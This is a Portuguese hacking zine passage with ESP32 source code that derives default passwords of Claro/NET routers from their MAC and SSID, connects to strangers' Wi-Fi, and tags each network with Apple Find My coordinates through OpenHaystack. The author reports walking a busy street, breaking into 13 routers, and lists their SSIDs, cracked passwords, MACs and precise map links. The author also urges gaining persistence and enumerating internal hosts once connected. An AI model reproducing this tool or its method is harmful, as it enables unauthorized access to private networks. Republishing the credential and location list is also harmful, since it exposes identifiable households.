+    ·<g2>░<ww>░<g1><ww>  entao agr ja temos um rastreador funcionando, hora de fzr ele ownar  <g2>░░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  algo                                                                 <g2>░░<g1>░<ww>
+    ░<g1>░<g2>░<g1><ww>                                                                       ░<g1>░<g2>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>                                                                       <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  ~~{ 3 - juntando com DPWO                                            <g2>░<g1>░░<g1><ww>
+    <g2>░<g1>░░<g1><ww>                                                                       <g2>░<g1>░░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  somando isso ao DPWO (que eh genial pra pwnar wifi alheio)           <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  torna possivel fazer o tracking de todas as redes ownadas e as       <g2>░<g1>░░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  coordenadas ateh com um ESP32-C3 super mini! (tamanho: 22.52x18mm)   <g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>                                                                       <g2>░░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>  entao a ideia basicamente eh:                                        ░<g1>░<g2>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>                                                                       ░<g1>░<g2>░<g1><ww>
+    <g2>░░<g1>░<ww>  &gt; DPWO acha rede vuln e o ESP32-S3 se conecta nela                   <g2>░<g1>░░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>                                                                       ·<g2>░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  &gt; (somente no primeiro host) fazer request para um server de NTP pra <g2>░░<g1>░<ww>
+    ░<g1>░<g2>░<g1><ww>  pegar o timestamp atual e guardar junto do CSV para comparar depois  <g2>░<g1>░░<g1><ww>
+    <g2>░░<ww>░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    <g2>░░<ww>░<g1><ww>  &gt; mandar requisicoes por bluetooth pra interagir com os iphones      ░<g1>░<g2>░<g1><ww>
+    <g2>░░<g1>░<ww>  proximos e atualizar a localizacao                                   ·<g2>░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>                                                                       <g2>░░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  &gt; no final, faz a comparacao por timestamp e as localizacoes         <g2>░░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  q pegamos da api da apple                                            <g2>░░<g1>░<ww>
+    ░<g1>░<g2>░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>  essa parte foi bem direta, pois ainda com a mesma logica do dpwo     <g2>░░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  deu p ownar varios routers desatualizados                            ░<g1>░<g2>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  acredito q o caioluders ja explicou muito bem em varios lugares o_o  ░<g1>░<g2>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>                                                                       ·<g2>░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  entao se vc ta na caverna e nao sabe oq eh DPWO ainda, recomendo que <g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>  pare aqui e veja os posts tipo o link [4] na conclusao ateh entender ░<g1>░<g2>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  do que se trata                                                      <g2>░░<g1>░<ww>
+    <g2>░░<ww>░<g1><ww>                                                                       ░<g1>░<g2>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  agora se vc ja sabe oq eh, vc ta sabe q eh soh                       <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  pegar o MAC do roteador e SSID e parsear para                        ·<g2>░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  obter a senha, caso ele esteja no padrao                             ·<g2>░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  *agora os novos routers tem um padrao diferente, o router cria uma   <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>  senha fzndo algum algoritmo e eh possivel dumpar o firmware para     <g2>░<g1>░░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  tentar entender como o novo padrao eh gerado                         <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>                                                                       <g2>░<g1>░░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  lembrando que tbm no final, preciso guardar as informacoes coletadas <g2>░░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  e vamos fazer isso usando LittleFS, um filesystem no proprio         ░<g1>░<g2>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  microcontrolador para nao depender de cartao SD tbm                  <g2>░░<g1>░<ww>
+    <g2>░░<ww>░<g1><ww>                                                                       <g2>░<g1>░░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  o codigo da tramoia esta no final deste arquivo entao vc mesmo pode  <g2>░░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  ler a source e entender ou modificar oq esta acontecendo             <g2>░░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>                                                                       <g2>░░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>                                                                       ░<g1>░<g2>░<g1><ww>
+    <g2>░░<g1>░<ww>  ~~{ 4 - warwalking                                                   ░<g1>░<g2>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>                                                                       ░<g1>░<g2>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  agora vem a parte pratica! no caso a ideia era fzr um warbiking      <g2>░░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  e com os resultados que receber, anotar os pontos com o              <g2>░<g1>░░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  SSID dos roteadores pwnados nas coordenadas recebidas e              <g2>░░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  passar para o openstreetmap                                          ░<g1>░<g2>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>                                                                       <g2>░░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>  coloquei o esp32 na bag (sem antena) ligado                          <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  a um powerbank e pedalei  pelo centro em um dia que nao tinha        ░<g1>░<g2>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  muitas pessoas, e os resultados nao foram mt bons...                 ·<g2>░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>  circulei por volta de 30 minutos no centro e                         <g2>░░<g1>░<ww>
+    ░<g1>░<g2>░<g1><ww>  esses sao os resultados da primeira pedalada                         ·<g2>░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  no arquivo &#x27;./a.csv&#x27; do LittleFS:                                    ░<g1>░<g2>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>                                                                       <g2>░<g1>░░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>      SSID,SENHA,MAC,TIMESTAMP                                         <g2>░░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>      CLARO_2GAFB787,EFAFB787,743AEFAFB787,1725xxxxxx                  <g2>░<g1>░░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>      CLARO_2G8DB5B3,388DB5B3,C85D388DB5B3,1725xxxxxx                  <g2>░<g1>░░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>      CLARO_2G02A47B,E702A47B,9877E702A47B,1725xxxxxx                  <g2>░<g1>░░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>      NET_2G095A79,E2095A79,E820E2095A79,1725xxxxxx                    <g2>░<g1>░░<g1><ww>
+    <g2>░<g1>░░<g1><ww>                                                                       ░<g1>░<g2>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  pq sera soh 4 redes vuln?                                            <g2>░<g1>░░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  isso eh pq no codigo, assim que tentamos conectar em um              <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  wifi, precisamos fazer uma comparacao e ver o status do wifi         <g2>░░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  para ver se estou conectado, o que foi usado um delay de 4 segundos  <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  que afetou os resultados pq enquanto estava pedalando                <g2>░░<g1>░<ww>
+    <g2>░░<ww>░<g1><ww>  e dentro dessa janela de tempo saisse do alcance do wifi             <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>  tambem iria desconectar da rede + meu sinal era curto sem antena e   <g2>░<g1>░░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  dentro da bag. entao recomendo que altere esse delay dependendo do   ░<g1>░<g2>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  caso que vc for usar e nao pode ser mt curto tbm                     ░<g1>░<g2>░<g1><ww>
+    <g2>░░<g1>░<ww>                                                                       <g2>░░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>  lembrando que tambem soh iria fzr o advertisement da chave           <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  apos ter pwnado uma rede e depende de dispositivos da apple prox     <g2>░<g1>░░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>                                                                       <g2>░░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  e como nao sou tao ciclista assim                                    <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>                                                                       ░<g1>░<g2>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  depois realizei um teste andando mesmo pela XV (rua conhecida)       ·<g2>░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>  em um dia muito movimentado no horario de almoco                     <g2>░<g1>░░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  e os resultados foram muito diferentes...                            ·<g2>░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>                                                                       <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  andei por aprox 60 minutos e me conectei em 13 roteadores diferentes ░<g1>░<g2>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  esses foram os resultados apos filtrar o que ficou salvo no .csv e   ·<g2>░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  comparar com as timestamps do openhaystack                           ░<g1>░<g2>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>                                                                       <g2>░<g1>░░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  SSID,SENHA,BSSID(MAC) CRU,TIMESTAMP,LINK OPENSTREETMAP               <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  CLARO_2GF45F0C,1FF45F0C,ECA81FF45F0C,17266xxxxx,openstreetmap.org/#ma<g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>  p=18/-25.4325618/-49.2760825                                         <g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>  CLARO_2G8E841A,A38E841A,841EA38E841A,17267xxxxx,openstreetmap.org/#ma·<g2>░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  p=18/-25.431804/-49.2770474                                          <g2>░░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  CLARO_2G499A82,E5499A82,B0BBE5499A82,17267xxxxx,openstreetmap.org/#ma<g2>░░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  p=18/-25.4325458/-49.2749072                                         <g2>░░<g1>░<ww>
+    <g2>░░<ww>░<g1><ww>  NET_2GEEE2B0,69EEE2B0,2C9569EEE2B0,17267xxxxx,openstreetmap.org/#map=<g2>░<g1>░░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  18/-25.4323242/-49.2749558                                           <g2>░░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>  CLARO_2G986E2A,12986E2A,840112986E2A,17267xxxxx,openstreetmap.org/#ma░<g1>░<g2>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  p=18/-25.4321298/-49.2741386                                         ░<g1>░<g2>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  NET_2G2A4974,2F2A4974,D4B92F2A4974,17267xxxxx,openstreetmap.org/#map=<g2>░░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  18/-25.4320586/-49.2744143                                           ·<g2>░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  CLARO_2GE2DB11,B4E2DB11,8CC5B4E2DB11,17267xxxxx,openstreetmap.org/#ma░<g1>░<g2>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  p=18/-25.4317459/-49.2731804                                         ░<g1>░<g2>░<g1><ww>
+    <g2>░░<g1>░<ww>  CLARO_2G5946C8,DA5946C8,8020DA5946C8,17267xxxxx,openstreetmap.org/#ma<g2>░<g1>░░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  p=18/-25.4318492/-49.2734772                                         ·<g2>░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  NET_2G88F04F,5C88F04F,54A65C88F04F,17267xxxxx,openstreetmap.org/#map=<g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  18/-25.4318032/-49.2734319                                           ░<g1>░<g2>░<g1><ww>
+    <g2>░░<g1>░<ww>  CLARO_2GC955B9,BBC955B9,A86ABBC955B9,17267xxxxx,openstreetmap.org/#ma<g2>░░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  p=18/-25.4315053/-49.2725334                                         <g2>░<g1>░░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  CLARO_2GAC0BC0,C3AC0BC0,90AAC3AC0BC0,17267xxxxx,openstreetmap.org/#ma·<g2>░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  p=18/-25.4313985/-49.2721424                                         <g2>░<g1>░░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  CLARO_2G93699C,1293699C,84011293699C,17267xxxxx,openstreetmap.org/#ma<g2>░░<g1>░<ww>
+    ░<g1>░<g2>░<g1><ww>  p=18/-25.4312772/-49.2716799                                         ░<g1>░<g2>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  CLARO_2GD14265,BBD14265,A86ABBD14265,17267xxxxx,openstreetmap.org/#ma░<g1>░<g2>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  p=18/-25.4311774/-49.2720125                                         <g2>░░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>                                                                       ░<g1>░<g2>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    ░<g1>░<g2>░<g1><ww>  eh ok... esperava mais, porem ainda acredito que tem como fazer      <g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>  alguma corrida bem melhor que essa e ownar bem mais, e depende       <g2>░<g1>░░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  daonde vc vai tbm claro XD                                           <g2>░░<g1>░<ww>
+    ·<g2>░<ww>░<g1><ww>                                                                       ·<g2>░<ww>░<g1><ww>
+    <g2>░░<g1>░<ww>  no codigo vc pode fazer qlqr coisa dentro                            <g2>░░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  da rede da pessoa depois de conectado, tentar verificar              ░<g1>░<g2>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  alguma versao e exploitar algo para pegar persistencia, enumerar     <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  hosts internos, etc as possibilidades dps de conectado sao infinitas ░<g1>░<g2>░<g1><ww>
+    <g2>░░<g1>░<ww>                                                                       ░<g1>░<g2>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>                                                                       ·<g2>░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  ~~{ 5 - conclusao                                                    ░<g1>░<g2>░<g1><ww>
+    <g2>░░<g1>░<ww>                                                                       <g2>░░<g1>░<ww>
+    ░<g1>░<g2>░<g1><ww>  agora mais empresas grandes estao comecando a usar essa              <g2>░░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  tecnologia para criar a rede deles de localizacao                    <g2>░<g1>░░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  como o que esta sendo com a samsung e google, no caso da             <g2>░░<g1>░<ww>
+    <g2>░<g1>░░<g1><ww>  samsung ela ja produz as smart tags dela e ja eh compativel          <g2>░<g1>░░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  com quem usa o ambiente da samsung e a nova linha do                 ░<g1>░<g2>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  Pixel ja vai vir com compatibilidade para uma rede parecida          ·<g2>░<ww>░<g1><ww>
+    <g2>░░<ww>░<g1><ww>                                                                       ·<g2>░<ww>░<g1><ww>
+    <g2>░<g1>░░<g1><ww>  imagine se um mesmo dispositivo pequeno pudesse                      <g2>░░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  interagir com cada um desses servicos independentemente,             <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  alem de ter um rastreador mt bom e barato usando a rede              <g2>░░<ww>░<g1><ww>
+    ░<g1>░<g2>░<g1><ww>  das evil techs pra localizar qlqr plaquinha enquanto exploita algo   ░<g1>░<g2>░<g1><ww>
+    <g2>░░<g1>░<ww>                                                                       ░<g1>░<g2>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  espero q tenham curtido o texto, nos vemos pela net                  ░<g1>░<g2>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>                                                                       <g2>░<g1>░░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  s4lv3 a todos q curtem uma tramoia.                                  <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>                                                                       <g2>░<g1>░░<g1><ww>
+    <g2>░░<g1>░<ww>  refs:                                                                ·<g2>░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  - [1] <a src="https://petsymposium.org/popets/2021/popets-2021-0045.pdf">https://petsymposium.org/popets/2021/popets-2021-0045.pdf      </a><g2>░<g1>░░<g1><ww>
+    <g2>░░<ww>░<g1><ww>  - [2] <a src="https://github.com/MatthewKuKanich/FindMyFlipper">https://github.com/MatthewKuKanich/FindMyFlipper               </a>·<g2>░<ww>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  - [3] <a src="https://github.com/seemoo-lab/openhaystack">https://github.com/seemoo-lab/openhaystack                     </a>░<g1>░<g2>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>  - [4] <a src="https://lude.rs/h4ck1ng/NET_2GXXXX_default_password.html">https://lude.rs/h4ck1ng/NET_2GXXXX_default_password.html       </a><g2>░░<g1>░<ww>
+    ░<g1>░<g2>░<g1><ww>  - [5] <a src="https://docs.espressif.com">https://docs.espressif.com                                     </a>░<g1>░<g2>░<g1><ww>
+    <g2>░░<g1>░<ww>                                                                       ░<g1>░<g2>░<g1><ww>
+    ·<g2>░<ww>░<g1><ww>                                                                       <g2>░░<g1>░<ww>
+    ·░░<g1>                                                                       ░<g1>░<g2>░<g1>
+    ··░                                                                       ░··
+
+arquivos:
+main.ino
+
+#include &lt;WiFi.h&gt;
+#include &lt;regex&gt;
+#include &lt;stdint.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdbool.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;FS.h&gt;
+#include &lt;LittleFS.h&gt;
+#include "nvs_flash.h"
+#include "esp_bt.h"
+#include "esp_gap_ble_api.h"
+#include "esp_gattc_api.h"
+#include "esp_gatt_defs.h"
+#include "esp_bt_main.h"
+#include "esp_bt_defs.h"
+#include "freertos/FreeRTOS.h"
+#include &lt;NTPClient.h&gt;
+#include &lt;Timezone.h&gt;
+
+int num_rede = 0;
+bool is_timezone_set, achou_dpwo;
+
+const char* ntpServer = "pool.ntp.org";
+long  selectedTimezone;
+const int   daylightOffset_sec = 0;
+int hora;
+
+TimeChangeRule BRST = {"BRST", Last, Sun, Oct, -3, hora};
+Timezone myTZ(BRST, BRST);
+
+WiFiUDP ntpUDP;
+NTPClient timeClient(ntpUDP, ntpServer, selectedTimezone, daylightOffset_sec);
+
+// definicoes do openhaystack
+
+// mude aqui para sua chave publica
+uint8_t public_key_decoded[28] = {
+    0x13, 0x45, 0xea, 0xef, 0xc0, 0xbb, 0x9c, 0x20,
+    0xe7, 0x94, 0x72, 0xb6, 0x09, 0x43, 0x75, 0xa3,
+    0x98, 0x2a, 0xd3, 0x9f, 0xbc, 0xb9, 0x5f, 0x94,
+    0xd1, 0xc6, 0xb6, 0xdd
+};
+
+/** Callback function for BT events */
+static void esp_gap_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param);
+
+/** Random device address */
+static esp_bd_addr_t rnd_addr = { 0xFF, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF };
+
+/** Advertisement payload */
+static uint8_t adv_data[31] = 
+{
+    0x1e, /* Tamnhado do payload em bytes (30) */
+    0xff, /* Tipo da propagacao (type 0xff) */
+    0x4c, 0x00, /* Id da compania (Apple) */
+    0x12, 0x19, /* tamanho do Offline Finding em bytes */
+    0x00, /* Status */
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, /* First two bits */
+    0x00, /* Hint (0x00) */
+};
+
+/* https://docs.espressif.com/projects/esp-idf/en/latest/esp32/api-reference/bluetooth/esp_gap_ble.html#_CPPv420esp_ble_adv_params_t */
+static esp_ble_adv_params_t ble_adv_params = 
+{
+    // Advertising min interval:
+    // Minimum advertising interval for undirected and low duty cycle
+    // directed advertising. Range: 0x0020 to 0x4000 Default: N = 0x0800
+    // (1.28 second) Time = N * 0.625 msec Time Range: 20 ms to 10.24 sec
+    .adv_int_min        = 0x0640, // 1s
+    // Advertising max interval:
+    // Maximum advertising interval for undirected and low duty cycle
+    // directed advertising. Range: 0x0020 to 0x4000 Default: N = 0x0800
+    // (1.28 second) Time = N * 0.625 msec Time Range: 20 ms to 10.24 sec
+    .adv_int_max        = 0x0C80, // 2s
+    // Advertisement type
+    .adv_type           = ADV_TYPE_NONCONN_IND,
+    // Use the random address
+    .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
+    // All channels
+    .channel_map        = ADV_CHNL_ALL,
+    // Allow both scan and connection requests from anyone. 
+    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
+};
+
+static void esp_gap_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param)
+{
+    esp_err_t err;
+
+    switch (event) {
+        case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
+            esp_ble_gap_start_advertising(&ble_adv_params);
+            break;
+
+        case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
+            if ((err = param->adv_start_cmpl.status) != ESP_BT_STATUS_SUCCESS) {
+            } else {
+                Serial.print("advertising has started\n");
+
+            }
+            break;
+
+        case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
+            if ((err = param->adv_stop_cmpl.status) != ESP_BT_STATUS_SUCCESS){
+                Serial.printf("adv stop failed: %s\n", esp_err_to_name(err));
+            }
+            else {
+                Serial.println("stop adv successfully\n");
+
+            }
+            break;
+        default:
+            break;
+    }
+}
+
+void set_addr_from_key(esp_bd_addr_t addr, uint8_t *public_key_decoded)
+{
+    addr[0] = public_key_decoded[0] | 0b11000000;
+    addr[1] = public_key_decoded[1];
+    addr[2] = public_key_decoded[2];
+    addr[3] = public_key_decoded[3];
+    addr[4] = public_key_decoded[4];
+    addr[5] = public_key_decoded[5];
+}
+
+void set_payload_from_key(uint8_t *payload, uint8_t *public_key_decoded)
+{
+    memcpy(&payload[7], &public_key_decoded[6], 22);
+    payload[29] = public_key_decoded[0] >> 6;
+}
+
+void openhaystack_setup()
+{
+    Serial.printf("using device address: %02x %02x %02x %02x %02x %02x\n", rnd_addr[0], rnd_addr[1], rnd_addr[2], rnd_addr[3], rnd_addr[4], rnd_addr[5]);
+
+    //esp_ble_gap_stop_advertising();
+
+    esp_err_t status;
+    //register the scan callback function to the gap module
+    if ((status = esp_ble_gap_register_callback(esp_gap_cb)) != ESP_OK) {
+        //ESP_LOGE(LOG_TAG, "gap register error: %s", esp_err_to_name(status));
+        Serial.printf("gap register error: %s\n", esp_err_to_name(status));
+        return;
+    }
+
+    if ((status = esp_ble_gap_set_rand_addr(rnd_addr)) != ESP_OK) {
+        //ESP_LOGE(LOG_TAG, "couldn't set random address: %s", esp_err_to_name(status));
+        Serial.printf("couldn't set random address: %s\n", esp_err_to_name(status));
+        return;
+    }
+    if ((esp_ble_gap_config_adv_data_raw((uint8_t*)&adv_data, sizeof(adv_data))) != ESP_OK) {
+        //ESP_LOGE(LOG_TAG, "couldn't configure BLE adv: %s", esp_err_to_name(status));
+        Serial.printf("couldn't configure BLE adv: %s\n", esp_err_to_name(status));
+        return;
+    }
+
+
+    Serial.println("application initialized");
+    Serial.println(status);
+
+}
+
+//essas peguei daki https://randomnerdtutorials.com/esp32-write-data-littlefs-arduino/
+
+void appendFile(fs::FS &fs, const char * path, const char * message)
+{
+    File file = fs.open(path, FILE_APPEND);
+    if(!file)
+    {
+        Serial.println("- failed to open file for appending");
+        return;
+    }
+    if(file.print(message))
+    {
+        //Serial.println("- message appended");
+    } else {
+        Serial.println("- append failed");
+    }
+    file.close();
+}
+
+void readFile(fs::FS &fs, const char * path)
+{
+    File file = fs.open(path);
+    if(!file || file.isDirectory())
+    {
+        Serial.println("- failed to open file for reading");
+        return;
+    }
+
+    Serial.println("-- read from file:");
+    while(file.available())
+    {
+        Serial.write(file.read());
+    }
+    file.close();
+}
+
+//funcoes do dpwo
+
+void net(int i)
+{
+    char bssid_cru[18];
+    char bssid_parseado[18];
+
+    strcpy(bssid_cru, WiFi.BSSIDstr(i).c_str());
+
+    int j = 0;
+    for (int x = 0; bssid_cru[x] != '\0'; ++x)
+    {
+        if (bssid_cru[x] != ':') {
+            bssid_parseado[++j] = bssid_cru[x];
+        }
+    }
+    bssid_parseado[j] = '\0';
+
+    char *senha_final = bssid_parseado + 4; 
+    senha_final[strlen(senha_final)-6] = '\0';
+    int tamanho_ssid = WiFi.SSID(i).length();
+    if (tamanho_ssid >= 2)
+    {
+      String ultimo_dois = WiFi.SSID(i).substring(tamanho_ssid - 6);
+      strcat(senha_final, ultimo_dois.c_str());
+    } else {
+      Serial.println("ERROR");
+    }
+    Serial.println(WiFi.SSID(i).c_str());
+    Serial.println(senha_final);
+
+    WiFi.begin(WiFi.SSID(i).c_str(), senha_final);
+    delay(4000);
+    while (WiFi.status() != WL_CONNECTED)
+    {
+      WiFi.disconnect();
+      return;
+    }
+
+    Serial.println("NET CONECTADO");
+    
+    if(!is_timezone_set)
+    {
+      timeClient.begin();
+      is_timezone_set=true;
+    }
+    timeClient.update();
+    
+    appendFile(LittleFS, "/a.csv", WiFi.SSID(i).c_str());
+    appendFile(LittleFS, "/a.csv", ",");
+    appendFile(LittleFS, "/a.csv", senha_final);
+    appendFile(LittleFS, "/a.csv", ",");
+    appendFile(LittleFS, "/a.csv", bssid_parseado);
+    appendFile(LittleFS, "/a.csv", ",");
+    appendFile(LittleFS, "/a.csv", String(timeClient.getEpochTime()).c_str());
+    appendFile(LittleFS, "/a.csv", "\n");
+
+    achou_dpwo=true;
+    WiFi.disconnect();
+    //WiFi.mode(WIFI_OFF);
+}
+
+void claro(int i)
+{
+    char bssid_cru[18];
+    char bssid_parseado[18];
+
+    strcpy(bssid_cru, WiFi.BSSIDstr(i).c_str());
+
+    int j = 0;
+    for (int x = 0; bssid_cru[x] != '\0'; ++x) {
+      if (bssid_cru[x] != ':') {
+        bssid_parseado[++j] = bssid_cru[x];
+      }
+    }
+    bssid_parseado[j] = '\0';
+
+    char *senha_final = bssid_parseado + 4;
+    senha_final[strlen(senha_final)-2] = '\0';
+    int tamanho_ssid = WiFi.SSID(i).length();
+    if (tamanho_ssid >= 2)
+    {
+        String ultimo_dois = WiFi.SSID(i).substring(tamanho_ssid - 2);
+        strcat(senha_final, ultimo_dois.c_str());
+    }
+
+    Serial.println(WiFi.SSID(i).c_str());
+    Serial.println(senha_final);
+
+    WiFi.begin(WiFi.SSID(i).c_str(), senha_final);
+    delay(4000);
+    while (WiFi.status() != WL_CONNECTED)
+    {
+      WiFi.disconnect();
+      //WiFi.mode(WIFI_OFF);
+      return;
+    }
+
+    Serial.println("CLARO CONECTADO");
+    
+    if(!is_timezone_set){
+      timeClient.begin();
+      is_timezone_set=true;
+    }
+    timeClient.update();
+    
+    appendFile(LittleFS, "/a.csv", WiFi.SSID(i).c_str());
+    appendFile(LittleFS, "/a.csv", ",");
+    appendFile(LittleFS, "/a.csv", senha_final);
+    appendFile(LittleFS, "/a.csv", ",");
+    appendFile(LittleFS, "/a.csv", bssid_parseado);
+    appendFile(LittleFS, "/a.csv", ",");
+    appendFile(LittleFS, "/a.csv", String(timeClient.getEpochTime()).c_str());
+    appendFile(LittleFS, "/a.csv", "\n");
+
+    achou_dpwo=true;
+    WiFi.disconnect();
+    //WiFi.mode(WIFI_OFF);
+}
+
+void setup()
+{
+    Serial.begin(115200);
+    WiFi.mode(WIFI_STA);
+    num_rede = WiFi.scanNetworks();
+
+  LittleFS.begin();
+
+  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
+    esp_bt_controller_init(&bt_cfg);
+    esp_bt_controller_enable(ESP_BT_MODE_BLE);
+
+    esp_bluedroid_init();
+    esp_bluedroid_enable();
+    //esp_bt_controller_enable(ESP_BT_MODE_BLE);
+
+    set_addr_from_key(rnd_addr, public_key_decoded);
+    set_payload_from_key(adv_data, public_key_decoded);
+    Serial.println("Fim do setup");
+}
+
